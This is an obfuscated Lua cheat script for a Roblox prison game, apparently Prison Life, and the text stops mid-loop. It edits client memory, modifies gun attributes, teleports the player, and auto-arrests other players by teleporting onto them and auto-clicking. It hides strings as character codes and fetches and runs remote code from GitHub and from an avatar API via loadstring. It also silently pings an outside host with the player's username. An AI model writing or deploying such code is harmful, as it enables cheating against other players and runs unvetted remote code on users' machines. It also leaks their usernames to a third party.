--[[
    Check it Interface
    by hitechboi / nejrio
    github.com/hitechboi
    star my post :p, have fun!
]]
local _0xD=function(b)local r=""for i=1,#b do r=r..string.char(b[i])end return r end
local tick = tick or os.clock
local warn = warn or function(msg) end
local _0x00=math.floor local _0x01=table.insert local _0x02=pairs local _0x03=ipairs local _0x04=pcall local _0x05=Vector3.new
local _0xGID=0;pcall(function()_0xGID=_0x00(game.GameId)end)
if _0xGID~=_0x00(73885730)then pcall(function()notify(_0xD({67,104,101,99,107,32,105,116}),_0xD({84,104,105,115,32,115,99,114,105,112,116,32,105,115,32,110,111,116,32,115,117,112,112,111,114,116,101,100,32,102,111,114,32,116,104,105,115,32,103,97,109,101,46}),5)end)return end
if _G.MyMoms_Cleanup then pcall(_G.MyMoms_Cleanup) task.wait(0.2) end
_G.MyMoms_Cleanup = function() end

-- CFrame Support (memory-based teleports, from cframesupport.lua)
local _cfOK = false
pcall(function()
    if type(memory_read)=="function" and type(memory_write)=="function" and type(getbase)=="function" then
        getbase()
        _cfOK = true
    end
end)
local _cfOff = { prim=0x148, cf=0xC0, Anchored=0x12C, CanCollide=0x12D }
local function _cfGetPrim(inst) return memory_read("uintptr_t", inst.Address + _cfOff.prim) end
local function _cfRead(inst)
    local b = _cfGetPrim(inst) + _cfOff.cf
    return {
        rot = {
            r00=memory_read("float",b),    r01=memory_read("float",b+4),  r02=memory_read("float",b+8),
            r10=memory_read("float",b+12),  r11=memory_read("float",b+16), r12=memory_read("float",b+20),
            r20=memory_read("float",b+24),  r21=memory_read("float",b+28), r22=memory_read("float",b+32),
        },
        pos = { X=memory_read("float",b+36), Y=memory_read("float",b+40), Z=memory_read("float",b+44) },
    }
end
local function _cfWrite(inst, cf)
    local b = _cfGetPrim(inst) + _cfOff.cf
    memory_write("float",b,cf.rot.r00)     memory_write("float",b+4,cf.rot.r01)  memory_write("float",b+8,cf.rot.r02)
    memory_write("float",b+12,cf.rot.r10)  memory_write("float",b+16,cf.rot.r11) memory_write("float",b+20,cf.rot.r12)
    memory_write("float",b+24,cf.rot.r20)  memory_write("float",b+28,cf.rot.r21) memory_write("float",b+32,cf.rot.r22)
    memory_write("float",b+36,cf.pos.X)    memory_write("float",b+40,cf.pos.Y)   memory_write("float",b+44,cf.pos.Z)
end
local function _cfSetFlag(part, flag, state)
    local off = _cfOff[flag]
    if off then pcall(function() memory_write("byte", part.Address + off, state and 1 or 0) end) end
end
local function _cfGetFlag(part, flag)
    local off = _cfOff[flag]
    if not off then return nil end
    local r = nil
    pcall(function() r = memory_read("byte", part.Address + off) == 1 end)
    return r
end
local function _cfLookAt(fromPos, targetPos)
    local dx = targetPos.X - fromPos.X
    local dy = targetPos.Y - fromPos.Y
    local dz = targetPos.Z - fromPos.Z
    local len = math.sqrt(dx*dx + dy*dy + dz*dz)
    if len == 0 then return {r00=1,r01=0,r02=0,r10=0,r11=1,r12=0,r20=0,r21=0,r22=1} end
    dx,dy,dz = dx/len,dy/len,dz/len
    local yaw = math.atan2(dx, dz)
    local pitch = math.atan2(-dy, math.sqrt(dx*dx + dz*dz))
    local cp,sp = math.cos(pitch),math.sin(pitch)
    local cy,sy = math.cos(yaw),math.sin(yaw)
    return { r00=cy,r01=0,r02=sy, r10=sy*sp,r11=cp,r12=-cy*sp, r20=-sy*cp,r21=sp,r22=cy*cp }
end
--if _cfOK then print("[PrisonLife] CFrame support active (Unsafe Lua)") end
local function _cfLerpF(a, b, t) return a + (b - a) * t end
local function _cfEaseInOutSine(t) return -(math.cos(math.pi * t) - 1) / 2 end
local function _cfRotToQuat(rot)
    local tr = rot.r00 + rot.r11 + rot.r22
    local w,x,y,z
    if tr > 0 then
        local s = 0.5 / math.sqrt(tr + 1)
        w = 0.25 / s  x = (rot.r21 - rot.r12) * s
        y = (rot.r02 - rot.r20) * s  z = (rot.r10 - rot.r01) * s
    elseif rot.r00 > rot.r11 and rot.r00 > rot.r22 then
        local s = 2 * math.sqrt(1 + rot.r00 - rot.r11 - rot.r22)
        w = (rot.r21 - rot.r12) / s  x = 0.25 * s
        y = (rot.r01 + rot.r10) / s  z = (rot.r02 + rot.r20) / s
    elseif rot.r11 > rot.r22 then
        local s = 2 * math.sqrt(1 + rot.r11 - rot.r00 - rot.r22)
        w = (rot.r02 - rot.r20) / s  x = (rot.r01 + rot.r10) / s
        y = 0.25 * s  z = (rot.r12 + rot.r21) / s
    else
        local s = 2 * math.sqrt(1 + rot.r22 - rot.r00 - rot.r11)
        w = (rot.r10 - rot.r01) / s  x = (rot.r02 + rot.r20) / s
        y = (rot.r12 + rot.r21) / s  z = 0.25 * s
    end
    return {w=w, x=x, y=y, z=z}
end
local function _cfQuatToRot(q)
    return {
        r00=1-2*(q.y*q.y+q.z*q.z), r01=2*(q.x*q.y-q.z*q.w), r02=2*(q.x*q.z+q.y*q.w),
        r10=2*(q.x*q.y+q.z*q.w), r11=1-2*(q.x*q.x+q.z*q.z), r12=2*(q.y*q.z-q.x*q.w),
        r20=2*(q.x*q.z-q.y*q.w), r21=2*(q.y*q.z+q.x*q.w), r22=1-2*(q.x*q.x+q.y*q.y),
    }
end
local function _cfSlerp(a, b, t)
    local qa = _cfRotToQuat(a.rot)
    local qb = _cfRotToQuat(b.rot)
    local dot = qa.w*qb.w + qa.x*qb.x + qa.y*qb.y + qa.z*qb.z
    if dot < 0 then qb = {w=-qb.w,x=-qb.x,y=-qb.y,z=-qb.z} dot = -dot end
    if dot > 0.9995 then dot = 0.9995 end
    local theta = math.acos(dot)
    local sinT = math.sin(theta)
    local wa, wb
    if sinT < 0.001 then wa = 1 - t  wb = t
    else wa = math.sin((1-t)*theta)/sinT  wb = math.sin(t*theta)/sinT end
    local qr = {w=wa*qa.w+wb*qb.w, x=wa*qa.x+wb*qb.x, y=wa*qa.y+wb*qb.y, z=wa*qa.z+wb*qb.z}
    local len = math.sqrt(qr.w^2+qr.x^2+qr.y^2+qr.z^2)
    if len > 0 then qr.w=qr.w/len qr.x=qr.x/len qr.y=qr.y/len qr.z=qr.z/len end
    return {
        rot = _cfQuatToRot(qr),
        pos = {X=_cfLerpF(a.pos.X,b.pos.X,t), Y=_cfLerpF(a.pos.Y,b.pos.Y,t), Z=_cfLerpF(a.pos.Z,b.pos.Z,t)}
    }
end
local function _cfSmoothTP(startPos, endPos, duration)
    duration = duration or 0.5
    local lp = game.Players.LocalPlayer
    local t0 = tick()
    while true do
        local el = tick() - t0
        local t = math.min(el / duration, 1)
        local et = _cfEaseInOutSine(t)
        local x = _cfLerpF(startPos.X, endPos.X, et)
        local y = _cfLerpF(startPos.Y, endPos.Y, et)
        local z = _cfLerpF(startPos.Z, endPos.Z, et)
        local alive = true
        pcall(function()
            local h = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            if h then
                h.AssemblyLinearVelocity = Vector3.new(0,0,0)
                h.Position = Vector3.new(x, y, z)
            else
                alive = false
            end
        end)
        if not alive or t >= 1 then break end
        task.wait(0.016)
    end
end

local _0x06={}local _0x07={}local _0x08=true local _0x09=os.clock()local _0x0A=0 local _0x0B={}local _0x0C=0 local _0x0E=10 local _0x0F=0
local function _0x10()local _s={}_s._c={}
function _s:Connect(_f)local _k={_fn=_f,_a=true}table.insert(_s._c,_k)return{Disconnect=function()_k._a=false _k._fn=nil end}end
function _s:Fire(...)local _i=1 while _i<=#_s._c do local _k=_s._c[_i]if _k._a then local _ok,_=_0x04(_k._fn,...)if not _ok then _0x0F=_0x0F+1 if _0x0F>=_0x0E then warn(string.format("[RS] Max errors (%d)",_0x0E))_0x08=false return end end _i=_i+1 else table.remove(_s._c,_i)end end end
function _s:Wait()local _t=coroutine.running()local _w _w=_s:Connect(function(...)if _w then _w:Disconnect()end task.spawn(_t,...)end)return coroutine.yield()end
return _s end
_0x06.Heartbeat=_0x10()_0x06.RenderStepped=_0x10()_0x06.Stepped=_0x10()
function _0x06:BindToRenderStep(_n,_p,_f)if type(_n)~="string"or type(_f)~="function"then return end _0x07[_n]={Priority=_p or 0,Function=_f}end
function _0x06:UnbindFromRenderStep(_n)_0x07[_n]=nil end
function _0x06:IsRunning()return _0x08 end
task.spawn(function()while _0x08 do local _ok=_0x04(function()local _t=os.clock()local _d=math.min(_t-_0x09,1)_0x09=_t _0x0A=_0x0A+1
if _0x08 then _0x06.Stepped:Fire(_t,_d)end
if _0x08 then local _n=0 for _ in _0x02(_0x07)do _n=_n+1 end if _n~=_0x0C then _0x0B={}for _,_b in _0x02(_0x07)do if _b and type(_b.Function)=="function"then table.insert(_0x0B,_b)end end table.sort(_0x0B,function(_a,_b)return _a.Priority<_b.Priority end)_0x0C=_n end for _i=1,#_0x0B do if not _0x08 then break end local _b=_0x0B[_i]if _b and _b.Function then _0x04(_b.Function,_d)end end end
if _0x08 then _0x06.RenderStepped:Fire(_d)end
if _0x08 then _0x06.Heartbeat:Fire(_d)end end)
if not _ok then _0x0F=_0x0F+1 if _0x0F>=_0x0E then _0x08=false break end else _0x0F=math.max(0,_0x0F-1)end
if _0x08 then task.wait(0.016)end end end)
local _0x11;do local _ok,_r=pcall(function()return loadstring(game:HttpGet(_0xD({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,105,116,101,99,104,98,111,105,47,99,104,101,99,107,105,116,118,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,98,114,111,99,111,108,105,46,108,117,97}).."?cache="..tostring(os.time())))()end);_0x11=_ok and _r or _G.UILib;if not _0x11 then pcall(function()notify("Check it","Failed to load UI library",5)end)return end end
do local _cvUrl="https://raw.githubusercontent.com/hitechboi/checkitv2/refs/heads/main/ChildVm.lua?t="..tostring(os.time())local _ok=pcall(function()loadstring(game:HttpGet(_cvUrl))()end)if _ok then local _t0=os.clock()repeat task.wait(0.05)until _G.ChildVm or (os.clock()-_t0)>12 end end
local _0x12=game.Players.LocalPlayer.Name local _0x13="";pcall(function()if type(getgetname)=="function"then _0x13=getgetname()elseif type(getgamename)=="function"then _0x13=getgamename()end end)
local _0x14=false local _0x15=false local _0x16=false local _0x17=false local _0x18=false local _0x19=false local _0x1A=false local _0x1B=false local _0x1C=false
local _0x1D=1 local _0x1E=0.01 local _0x1F=0.1 local _0x20=1500 local _0x21=false local _0x22=false
local _0x23={["AK-47"]=true,["MP5"]=true,["FAL"]=true,["M4A1"]=true}
local _0x24=game.Players.LocalPlayer local _0x25=nil
local function _0x26()_0x04(function()local _c=_0x24.Character if _c then _0x25=_c:FindFirstChild("Humanoid")end end)end _0x26()
local _0x27={MaxAmmo=function()return _0x15 and _0x1D end,CurrentAmmo=function()return _0x15 and _0x1D end,ReloadTime=function()return _0x16 and _0x1E end,FireRate=function(_t)if _0x18 then return 0.001 end if _0x17 then if _0x1A and _0x23[_t.Name]then return nil end return _0x1F end return nil end,Range=function()return _0x1C and _0x20 end}
local function _0x28(_t)if not _t:IsA("Tool")then return false end for _a in _0x02(_0x27)do if _t:GetAttribute(_a)~=nil then return true end end return false end
local function _0x29()local _b=_0x24:FindFirstChild("Backpack")local _c=0 if _b then for _,_t in _0x03(_b:GetChildren())do if _0x28(_t)then _c=_c+1 end end end return _c end
local function _0xCuffsHeld()local _c=_0x24.Character if not _c then return false end local _t=_c:FindFirstChild("Cuffs")or _c:FindFirstChild("Handcuffs")return _t and _t:IsA("Tool")end
local function _checkTools(parent)if not parent then return end for _,_t in _0x03(parent:GetChildren())do if _t.Name=="Remington 870"then if _t:GetAttribute("AutoFire")~=_0x19 then _t:SetAttribute("AutoFire",_0x19)end end if _0x1A and _0x23[_t.Name]then if _t:GetAttribute("FireRate")~=0.001 then _t:SetAttribute("FireRate",0.001)end end if _0x1B and _t.Name=="M9"then if _t:GetAttribute("AutoFire")~=true then _t:SetAttribute("AutoFire",true)end end if _0x28(_t)then for _a,_fn in _0x02(_0x27)do if _t:GetAttribute(_a)~=nil then local _v=_fn(_t)if _v and _t:GetAttribute(_a)~=_v then _t:SetAttribute(_a,_v)end end end end end end
local _0x2A=_0x11.Window(_0xD({67,104,101,99,107,32,105,116}),_0xD({73,110,116,101,114,102,97,99,101}),_0x13)
local _0x2B=_0x2A:Tab("Main")local _0x2C=_0x2A:Tab("Gun Mods")local _0xAutoT=_0x2A:Tab("Auto")local _0x2D=_0x2A:Tab("Fun")local _0x2E=_0x2A:Tab("Teleports")
local _0x34=_0x12=="besosme" and _0x2A:Tab("Active Users") or nil local _0x2F=_0x2A:Tab("Misc")local _0x30=_0x2A:Tab("Updates")
local _0xAC = false
local _0xAutoDeathTime = 0
_0x2B:Div("Main",true)_0x2B:Toggle("Enabled",false,function(_s)_0x14=_s end,"Master toggle for all gun mods")

_0xAutoT:Div("AUTO ARREST", true)
local _0xAutoBtn
_0xAutoBtn = _0xAutoT:Toggle("Auto Cuffs", false, function(s) 
    _0xAC = s 
    if s then pcall(function() 
        if tick() - _0xAutoDeathTime < 5 then
            _0xAC = false
            if _0xAutoBtn and type(_0xAutoBtn.SetState) == "function" then _0xAutoBtn:SetState(false) end
            pcall(function() if type(notify)=="function" then notify("Auto Arrest", "Hey chill out, wait 5 seconds to.", 4) end end)
            return
        end
        local t = _0x24.Team 
        if not t or (not string.match(string.lower(t.Name), "guard") and not string.match(string.lower(t.Name), "police")) then
            _0xAC = false
            if _0xAutoBtn and type(_0xAutoBtn.SetState) == "function" then _0xAutoBtn:SetState(false) end
            pcall(function() if type(notify)=="function" then notify("Auto Arrest","Warning: You aren't on the Guards team!",4) end end)
        end
    end) end
end, "Hold out cuffs. Checks Guards team. Teleports to Criminals & locks camera.")
local _0xArrestTarget = nil
local _0xCrimAddrByIdx = {}
local _0xTargetInitOpts = {"All Criminals"} for _i=2,13 do _0xTargetInitOpts[_i]=" " end
local _0xTargetDD = _0xAutoT:Dropdown("Arrest Target", _0xTargetInitOpts, 1, function(val, idx)
    if idx == 1 then _0xArrestTarget = nil
    else _0xArrestTarget = _0xCrimAddrByIdx[idx] or nil end
end)
if _0xTargetDD and _0xTargetDD.SetOptions then _0xTargetDD:SetOptions({"All Criminals"}) end
_0x2C:Div("FIRE",true)
_0x2C:Toggle("Apply Reload",false,function(_s)_0x16=_s end,"Toggles Reload Slider(M9,Taser Only)")
_0x2C:Slider("Reload Time",0.01,5.0,0.01,function(_v)_0x1E=_v end,true,"Lower = faster reload")
_0x2C:Toggle("Apply Fire Rate",false,function(_s)_0x17=_s end,"Toggles FireRate Slider(ARs excluded if AR Instant on)")
_0x2C:Slider("Fire Rate",0.1,1.0,0.1,function(_v)_0x1F=_v end,true,"Lower = faster fire")
_0x2C:Div("EXTRAS",true)
_0x2C:Toggle("Instant Fire Rate",false,function(_s)_0x18=_s end,"Insta FireRate!!!")
_0x2C:Toggle("Shotgun Full Auto",false,function(_s)_0x19=_s end,"Toggles AutoFire on Remington 870(Requires firerate slider)")
_0x2C:Toggle("AR Instant Fire Rate",false,function(_s)_0x1A=_s end,"Instant fire for AK-47, MP5, FAL, M4A1")
_0x2C:Toggle("M9 Full Auto",false,function(_s)_0x1B=_s end,"Toggles AutoFire on M9 pistol")
_0x2C:Div("RANGE",true)
_0x2C:Toggle("Extend Range",false,function(_s)_0x1C=_s end,"Sets Range value")
_0x2C:Slider("Range",0,15000,1500,function(_v)_0x20=_0x00(_v)end)
_0x2D:Div("AMMO",true)
_0x2D:Toggle("Apply Ammo",false,function(_s)_0x15=_s end,"Visual only - once below original ammo count no damage")
_0x2D:Slider("Ammo Amount",1,9999,1,function(_v)_0x1D=_0x00(_v)end)
local function _0x31(_x,_y,_z)_0x04(function()
    local _h=_0x24.Character:FindFirstChild("HumanoidRootPart")
    if not _h then return end
    local _ox,_oy,_oz=_h.Position.X,_h.Position.Y,_h.Position.Z
    _cfSmoothTP({X=_ox,Y=_oy,Z=_oz}, {X=_x,Y=_y,Z=_z}, 0.25)
    task.wait(0.4)
    _cfSmoothTP({X=_x,Y=_y,Z=_z}, {X=_ox,Y=_oy,Z=_oz}, 0.25)
end)end
local function _0x32(_x,_y,_z)_0x04(function()
    local _h=_0x24.Character:FindFirstChild("HumanoidRootPart")
    if not _h then return end
    local _ox,_oy,_oz=_h.Position.X,_h.Position.Y,_h.Position.Z
    _cfSmoothTP({X=_ox,Y=_oy,Z=_oz}, {X=_x,Y=_y,Z=_z}, 0.5)
end)end
_0x2E:Div("CRIMINAL GUNS",true)
_0x2E:Button("Remington 870",_0x11.Colors.ROWBG,function()_0x31(-938.22,94.31,2039.17)end,_0x11.Colors.WHITE)
_0x2E:Button("AK-47",_0x11.Colors.ROWBG,function()_0x31(-931.39,94.37,2039.39)end,_0x11.Colors.WHITE)
_0x2E:Button("M700",_0x11.Colors.ROWBG,function()_0x31(-919.96,95.01,2036)end,_0x11.Colors.WHITE)
_0x2E:Button("FAL",_0x11.Colors.ROWBG,function()_0x31(-902.34,94.35,2047.93)end,_0x11.Colors.WHITE)
_0x2E:Div("COP GUNS",true)
_0x2E:Button("MP5",_0x11.Colors.ROWBG,function()_0x31(813.16,100.88,2229)end,_0x11.Colors.WHITE)
_0x2E:Button("Rem Cop",_0x11.Colors.ROWBG,function()_0x31(820.64,100.88,2228.95)end,_0x11.Colors.WHITE)
_0x2E:Button("M700 Cop",_0x11.Colors.ROWBG,function()_0x31(836.09,100.74,2229.32)end,_0x11.Colors.WHITE)
_0x2E:Button("M4A1",_0x11.Colors.ROWBG,function()_0x31(847.71,100.74,2229.33)end,_0x11.Colors.WHITE)
_0x2E:Div("LOCATIONS",true)
_0x2E:Button("Yard",_0x11.Colors.ROWBG,function()_0x32(784.12,98,2460.25)end,_0x11.Colors.WHITE)
_0x2E:Button("Nexus",_0x11.Colors.ROWBG,function()_0x32(873.89,100,2390.69)end,_0x11.Colors.WHITE)
_0x2E:Button("Cafeteria",_0x11.Colors.ROWBG,function()_0x32(901.37,99.99,2299.91)end,_0x11.Colors.WHITE)
_0x2E:Button("Guard Station",_0x11.Colors.ROWBG,function()_0x32(829.99,99.99,2295.10)end,_0x11.Colors.WHITE)
_0x2E:Button("Armory",_0x11.Colors.ROWBG,function()_0x32(827.54,99.98,2240.20)end,_0x11.Colors.WHITE)
_0x2E:Button("Prison Cells",_0x11.Colors.ROWBG,function()_0x32(920.01,99.99,2442.30)end,_0x11.Colors.WHITE)
_0x2E:Button("Roof",_0x11.Colors.ROWBG,function()_0x32(932.23,118.99,2365.07)end,_0x11.Colors.WHITE)
_0x2E:Button("Criminal Base",_0x11.Colors.ROWBG,function()_0x32(-936.75,94.13,2054.35)end,_0x11.Colors.WHITE)

_0x2F:Div("INFO",true)
_0x2F:Button(_0xD({98,121,32,104,105,116,101,99,104,98,111,105,32,47,32,110,101,106,114,105,111}),_0x11.Colors.ROWBG,nil,_0x11.Colors.GRAY)
_0x30:Div("UPDATE LOG")
_0x30:Log({"STAR MY POST ! :D", "> v1.3 - Smoother loading animation", "> v1.3 - Auto Cuffs auto-disables on death", "> v1.3 - Fixed major crashing issues due to not using the right functions", "> hi :p"},true)
local _0x38 = game.Players.LocalPlayer.Name

if _0x34 and _0x38 == "besosme" then
    _0x34:Div("LIVE PLAYERS", true)
end
local _0x35 = _0x38 == "besosme" and _0x34 and _0x34:UserList(15) or nil
local _0x36 = true
local _0x37 = _0xD({104,116,116,112,115,58,47,47,97,110,121,116,104,105,110,103,45,98,101,105,103,101,46,118,101,114,99,101,108,46,97,112,112})

task.spawn(function()
    local _0x39 = pcall(function() return game.HttpGet end) or (type(HttpGet) == "function")
    local _0x3A = pcall(function() return game.HttpPost end) or (type(HttpPost) == "function")
    local _0x3B = nil
    pcall(function() _0x3B = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) end)
    if not (_0x39 and _0x3A) and not _0x3B then return end

    local _0x3C = _0x37:gsub("/+$", "")
    local _0x3D = {}
    local function _0x3E(user, index)
        if _0x3D[user] then
            if _0x35 and _0x35.SetUsers then _0x35:LoadAvatar(index, _0x3D[user]) end
            return
        end
        task.spawn(function()
            task.wait(index * 0.15)
            while _G.avatar_lock and _0x08 do task.wait(0.1) end
            if not _0x08 then return end
            _G.avatar_lock = true
            local s, code = pcall(function()
                local url = "https://api.luard.co/v1/user?v5=" .. user .. "&res=64"
                if type(game.HttpGet) == "function" then
                    return game:HttpGet(url)
                elseif type(HttpGet) == "function" then
                    return HttpGet(url)
                elseif _0x3B then
                    local res = _0x3B({Url = "https://api.luard.co/v1/user?v5=" .. user .. "&res=64", Method = "GET"})
                    if res and res.StatusCode == 200 then return res.Body end
                end
                return nil
            end)
            if s and code and #code > 100 then
                local ls, le = pcall(function() loadstring(code)() end)
                if ls and _G.avatar_data and _G.avatar_data.pixels then
                    _0x3D[user] = _G.avatar_data.pixels
                    if _0x35 and _0x35.SetUsers then
                        _0x35:LoadAvatar(index, _G.avatar_data.pixels)
                    end
                end
                _G.avatar_data = nil
            end
            _G.avatar_lock = false
            task.wait(0.2)
        end)
    end

    task.spawn(function()
        while _0x36 and _0x08 do
            pcall(function()
                local url = _0x3C .. "/ping?username=" .. _0x38
                if type(game.HttpGet) == "function" then
                    game:HttpGet(url)
                elseif type(HttpGet) == "function" then
                    HttpGet(url)
                elseif _0x3B then
                    _0x3B({Url = url, Method = "GET"})
                end
            end)
            for i=1, 30 do if not _0x36 or not _0x08 then break end task.wait(1) end
        end
    end)

    task.spawn(function()
        while _0x36 and _0x08 do
            local fetched = false
            pcall(function()
                local url = _0x3C .. "/users"
                local resBody = ""
                if type(game.HttpGet) == "function" then
                    resBody = game:HttpGet(url)
                elseif type(HttpGet) == "function" then
                    resBody = HttpGet(url)
                elseif _0x3B then
                    local res = _0x3B({ Url = url, Method = "GET" })
                    if res and res.StatusCode == 200 then resBody = res.Body end
                end

                if resBody and resBody ~= "" then
                    local names = {}
                    local usersStr = resBody:match('%[(.-)%]')
                    if usersStr then
                        for user in usersStr:gmatch('"(.-)"') do
                            table.insert(names, user)
                        end
                    end
                    if #names == 0 then table.insert(names, "No users online") end
                    
                    if _0x2A and _0x2A.SetActiveCount then
                        local realCount = (#names == 1 and names[1] == "No users online") and 0 or #names
                        _0x2A:SetActiveCount(realCount)
                    end

                    if _0x35 and _0x35.SetUsers then
                        _0x35:SetUsers(names, _0x38)
                    end
                    for i, user in ipairs(names) do
                        if i <= 15 then _0x3E(user, i) end
                    end
                    fetched = true
                end
            end)
            for i=1, 15 do if not _0x36 or not _0x08 then break end task.wait(1) end
        end
    end)
end)

_0x2A:SettingsTab(function()_0x21=true
    _0x36=false
    _0x2A:Destroy()
end)
_0x2A:Init("Main",function()return _0xD({71,117,110,115,32,100,101,116,101,99,116,101,100,58,32}).._0x29()end)
local _0xCVCharConn=nil
local _0xCVHealthConn=nil
local _0xCVBpConn=nil
local _0xCVCharWatcher=nil
local _0xCVTeamWatcher=nil
task.spawn(function()
if not _G.ChildVm then return end
local CV=_G.ChildVm
local _lastCharAddr=nil
_0x04(function()local c=_0x24.Character if c then _lastCharAddr=c.Address end end)
_0xCVCharWatcher={active=true,poll=function()
    local char,charAddr=nil,nil
    _0x04(function()char=_0x24.Character if char then charAddr=char.Address end end)
    if charAddr==_lastCharAddr then return end
    if _0xCVCharConn and _0xCVCharConn.Disconnect then _0x04(function()_0xCVCharConn:Disconnect()end)_0xCVCharConn=nil end
    if _0xCVHealthConn and _0xCVHealthConn.Disconnect then _0x04(function()_0xCVHealthConn:Disconnect()end)_0xCVHealthConn=nil end
    if _0xCVBpConn and _0xCVBpConn.Disconnect then _0x04(function()_0xCVBpConn:Disconnect()end)_0xCVBpConn=nil end
    if _lastCharAddr then _0xAutoDeathTime=tick() _0x22=true end
    _0x25=nil _lastCharAddr=charAddr
    if not char then return end
    _0x22=false
    _0x04(function()_0x25=char:FindFirstChild("Humanoid")end)
    if _0x14 then _checkTools(char)end
    _0xCVCharConn=CV:OnChildAdded(char,function()if _0x14 then _checkTools(char)end end)
    _0x04(function()
        local bp=_0x24:FindFirstChild("Backpack")
        if bp then
            _0xCVBpConn=CV:OnChildAdded(bp,function()if _0x14 then _checkTools(bp)end end)
            if _0x14 then _checkTools(bp)end
        end
    end)
    if _0x25 then
        _0xCVHealthConn=CV:OnPropertyChanged(_0x25,"Health",function(newHP)
            if newHP<=0 and not _0x22 then _0x22=true _0xAutoDeathTime=tick()end
        end)
    end
end}
table.insert(CV._watchers,_0xCVCharWatcher)
local _lastTeamAddr=nil
_0x04(function()local t=_0x24.Team if t then _lastTeamAddr=t.Address end end)
_0xCVTeamWatcher={active=true,poll=function()
    local teamAddr,teamName=nil,nil
    _0x04(function()local t=_0x24.Team if t then teamAddr=t.Address teamName=t.Name end end)
    if teamAddr==_lastTeamAddr then return end
    _lastTeamAddr=teamAddr
    if not teamName then return end
    local tl=string.lower(teamName)
    if not string.match(tl,"guard") and not string.match(tl,"police") then
        _0xAC=false
        if _0xAutoBtn and type(_0xAutoBtn.SetState)=="function" then _0x04(function()_0xAutoBtn:SetState(false)end)end
        pcall(function()if type(notify)=="function" then notify("Auto Arrest","You are no longer on Guards team.",3)end end)
    end
end}
table.insert(CV._watchers,_0xCVTeamWatcher)
end)
local _lastP = tick()
local _0x33=_0x06.Heartbeat:Connect(function()if _0x21 then _0x33:Disconnect()_0x08=false return end
local _now = tick()
if _now - _lastP < 0.1 then return end
_lastP = _now
if not _0x22 and _0x14 then _0x04(function()local _bp=_0x24:FindFirstChild("Backpack")local _char=_0x24.Character _checkTools(_bp)_checkTools(_char)end)end end)

task.spawn(function()
    local _0xLC = 0
    local _0xHadTargets = false
    local _0xLastCuffsWarn = 0
    while not _0x21 and _0x08 do
        task.wait(0.1)
        if not _0xAC then
            task.wait(0.2)
            _0xHadTargets = false
        else
            pcall(function()
                local _0xMT = _0x24.Team
                if not _0xMT then return end
                local _0xMTL = string.lower(_0xMT.Name)
                if not (string.find(_0xMTL, "guard") or string.find(_0xMTL, "police")) then return end
                if not _0x24.Character then return end
                local _0xMHP = _0x24.Character:FindFirstChild("HumanoidRootPart")
                if not _0xMHP then return end
                if not _0xCuffsHeld() then
                    if tick() - _0xLastCuffsWarn > 4 then
                        _0xLastCuffsWarn = tick()
                        pcall(function() if type(notify)=="function" then notify("Auto Arrest", "Hold out cuffs bro!", 3) end end)
                    end
                    return
                end

                local _0xTargetCount = 0
                for _, _0xP in ipairs(game.Players:GetPlayers()) do
                    if _0xP ~= _0x24 and _0xP.Team and string.find(string.lower(_0xP.Team.Name), "criminal") then
                        if not _0xArrestTarget or _0xP.Address == _0xArrestTarget then
                            _0xTargetCount = _0xTargetCount + 1
                        end
                    end
                end

                if _0xTargetCount == 0 and _0xAC then
                    _0xAC = false
                    if _0xAutoBtn and type(_0xAutoBtn.SetState) == "function" then pcall(function() _0xAutoBtn:SetState(false) end) end
                    pcall(function()
                        local msg = _0xHadTargets and "Arrested all criminals" or "Untoggled no criminals"
                        if type(notify) == "function" then notify("Auto Arrest", msg, 3) end
                    end)
                    _0xHadTargets = false
                    return
                end

                _0xHadTargets = true

                for _, _0xP in ipairs(game.Players:GetPlayers()) do
                    if not _0xAC then break end
                    if _0xP ~= _0x24 and _0xP.Team and string.find(string.lower(_0xP.Team.Name), "criminal") and (not _0xArrestTarget or _0xP.Address == _0xArrestTarget) then
                        local _0xWatchP = _0xP
                        local _0xTargetName = _0xWatchP.Name or "?"
                        pcall(function() if type(notify)=="function" then notify("Auto Arrest", "Arresting " .. _0xTargetName .. "...", 2) end end)
                        task.spawn(function()
                            local _sw = tick()
                            local _notified = false
                            while _0xWatchP and _0xWatchP.Parent and (tick() - _sw) < 12 do
                                task.wait(0.5)
                                if _0xWatchP.Team and string.find(string.lower(_0xWatchP.Team.Name), "inmate") then
                                    if not _notified then
                                        _notified = true
                                        pcall(function()
                                            if type(notify) == "function" then notify("Auto Arrest", "Successfully arrested " .. _0xWatchP.Name .. "!", 4) end
                                        end)
                                    end
                                    break
                                end
                            end
                        end)
                        local _0xST = tick()
                        while _0xAC and not _0x21 and (tick() - _0xST) < 5.5 do
                            task.wait(0.016)
                            if not _0xCuffsHeld() then break end
                            local _0xPC = _0xP.Character
                            local _0xMC = _0x24.Character
                            if not _0xPC or not _0xMC then break end
                            if _0x22 then
                                _0xAC = false
                                if _0xAutoBtn and type(_0xAutoBtn.SetState) == "function" then pcall(function() _0xAutoBtn:SetState(false) end) end
                                pcall(function()
                                    if type(notify) == "function" then notify("Auto Arrest", "You died! Turning off.", 4) end
                                end)
                                break
                            end
                            if not _0xP.Team or not string.find(string.lower(_0xP.Team.Name), "criminal") then
                                break
                            end
                            local _0xCHP = _0xPC:FindFirstChild("HumanoidRootPart")
                            local _0xMHP2 = _0xMC:FindFirstChild("HumanoidRootPart")
                            if not _0xCHP or not _0xMHP2 then break end
                            local _0xCP = _0xCHP.Position
                            _0xMHP2.Position = Vector3.new(_0xCP.X, _0xCP.Y, _0xCP.Z + 3)
                            pcall(function()
                                local _0xCM = workspace.CurrentCamera
                                if _0xCM and CFrame and CFrame.lookAt then
                                    _0xCM.CFrame = CFrame.lookAt(_0xMHP2.Position, _0xCP)
                                end
                            end)
                            if (tick() - _0xLC) > 0.15 then
                                pcall(function() if type(mouse1click)=="function" then mouse1click() elseif type(click)=="function" then click() end end)
                                _0xLC = tick()
                            end
                        end
                    end
                end
            end)
        end
    end
end)

local _0xLastOptStr=""
task.spawn(function()
    while not _0x21 and _0x08 do
        task.wait(1)
        if not _0xTargetDD then break end
        if _0xTargetDD.IsOpen and _0xTargetDD:IsOpen() then _0x04(function()end) else
        _0x04(function()
            local opts={"All Criminals"}
            local addrMap={}
            for _,p in ipairs(game.Players:GetPlayers()) do
                if p~=_0x24 and p.Team and string.find(string.lower(p.Team.Name),"criminal") then
                    local idx=#opts+1
                    opts[idx]=p.Name or "?"
                    addrMap[idx]=p.Address
                end
